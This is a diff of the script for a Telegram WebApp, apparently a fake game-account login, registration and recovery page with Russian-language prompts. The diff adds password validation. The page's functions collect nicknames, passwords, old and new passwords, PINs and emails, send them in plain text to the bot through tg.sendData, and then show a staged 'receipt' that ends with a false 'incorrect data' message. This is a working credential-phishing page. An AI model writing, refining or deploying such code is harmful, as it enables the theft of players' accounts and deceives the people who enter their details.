@@ -2,7 +2,6 @@ const tg = window.Telegram.WebApp;
 tg.ready();
 tg.expand();
 
-// === ЗАГРУЗКА ===
 let percent = 0;
 const bar = document.getElementById('bar');
 const percentText = document.getElementById('percent');
@@ -25,18 +24,51 @@ if (loader && main) {
     }, 30);
 }
 
-function onlyEnglish(input) { input.value = input.value.replace(/[^A-Za-z0-9_]/g, ''); }
-function onlyPin(input) { input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4); }
+function onlyEnglish(input) {
+    input.value = input.value.replace(/[^A-Za-z0-9_]/g, '');
+}
+
+function checkPassword() {
+    const pass = document.getElementById('password') || document.getElementById('new_password');
+    const icon = document.getElementById('iconPass') || document.getElementById('iconNewPass');
+    if (!pass || !icon) return;
+
+    const valid = /^[A-Za-z]{7,}$/.test(pass.value);
+
+    if (valid) {
+        icon.classList.remove('red');
+        icon.classList.add('green');
+    } else {
+        icon.classList.remove('green');
+        icon.classList.add('red');
+    }
+}
+
+function validatePassword(pass) {
+    return /^[A-Za-z]{7,}$/.test(pass);
+}
+
+function validateNick(nick) {
+    return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;
+}
 
 function checkNick() {
     const nick = document.getElementById('nick').value.trim();
     const icon = document.getElementById('iconNick');
     if (!icon) return;
-    const valid = /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;
-    if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
-    else { icon.classList.remove('green'); icon.classList.add('red'); }
+    const valid = validateNick(nick);
+    if (valid) {
+        icon.classList.remove('red');
+        icon.classList.add('green');
+    } else {
+        icon.classList.remove('green');
+        icon.classList.add('red');
+    }
 }
-function validateNick(nick) { return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5; }
+
+function onlyPin(input) {
+    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4);
+}
 
 function togglePin() {
     const checkbox = document.getElementById('hasPin');
@@ -60,6 +92,7 @@ function toggleServerList() {
     const dropdown = document.getElementById('serverDropdown');
     if (dropdown) dropdown.classList.toggle('active');
 }
+
 function selectServer(value) {
     const valueEl = document.getElementById('serverValue');
     const hiddenInput = document.getElementById('server');
@@ -72,7 +105,6 @@ function sendToBot(text) {
     try { tg.sendData(text); } catch (e) { console.error(e); }
 }
 
-// === ЧЕК ===
 function showReceipt(nick, server, type) {
     const now = new Date();
     const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
@@ -111,7 +143,7 @@ function showReceipt(nick, server, type) {
             clearInterval(interval);
             if (statusText) {
                 statusText.textContent = 'Вы ввели неверные данные';
-                statusText.style.color = '#6a0000'; // ТЁМНО-КРАСНЫЙ
+                statusText.style.color = '#6a0000';
                 statusText.style.fontWeight = '700';
             }
         }
@@ -127,22 +159,21 @@ function closeReceipt() {
 
 function goTo(page) { window.location.href = page; }
 
-// === ВХОД ===
 function login() {
     const nick = document.getElementById('nick').value.trim();
     const password = document.getElementById('password').value.trim();
     const pin = document.getElementById('pin').value.trim();
     const server = document.getElementById('server').value;
+
     if (!nick) { alert('Введите ник!'); return; }
     if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
-    if (!password) { alert('Введите пароль!'); return; }
+    if (!validatePassword(password)) { alert('Пароль: от 7 символов, только английские буквы!'); return; }
 
     const data = `🔐 ВХОД В АККАУНТ\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
     sendToBot(data);
     showReceipt(nick, server, 'Вход в аккаунт');
 }
 
-// === РЕГИСТРАЦИЯ ===
 function register() {
     const nick = document.getElementById('nick').value.trim();
     const password = document.getElementById('password').value.trim();
@@ -150,26 +181,27 @@ function register() {
     const email = document.getElementById('email').value.trim();
     const server = document.getElementById('server').value;
     const referrer = document.getElementById('referrer').value.trim();
+
     if (!nick) { alert('Введите ник!'); return; }
     if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
-    if (!password) { alert('Введите пароль!'); return; }
+    if (!validatePassword(password)) { alert('Пароль: от 7 символов, только английские буквы!'); return; }
 
     const data = `📝 РЕГИСТРАЦИЯ АККАУНТА\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n📧 Почта: ${email || 'нет'}\n🌍 Сервер: ${server}\n👥 Пригласил: ${referrer || 'нет'}`;
     sendToBot(data);
     showReceipt(nick, server, 'Создание аккаунта');
 }
 
-// === ВОССТАНОВЛЕНИЕ ===
 function recover() {
     const nick = document.getElementById('nick').value.trim();
     const oldPass = document.getElementById('old_password').value.trim();
     const newPass = document.getElementById('new_password').value.trim();
     const pin = document.getElementById('pin').value.trim();
     const server = document.getElementById('server').value;
+
     if (!nick) { alert('Введите ник!'); return; }
     if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
     if (!oldPass) { alert('Введите старый пароль!'); return; }
-    if (!newPass) { alert('Введите новый пароль!'); return; }
+    if (!validatePassword(newPass)) { alert('Новый пароль: от 7 символов, только английские буквы!'); return; }
 
     const data = `🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n👤 Ник: ${nick}\n🔓 Старый пароль: ${oldPass}\n🔒 Новый пароль: ${newPass}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
     sendToBot(data);
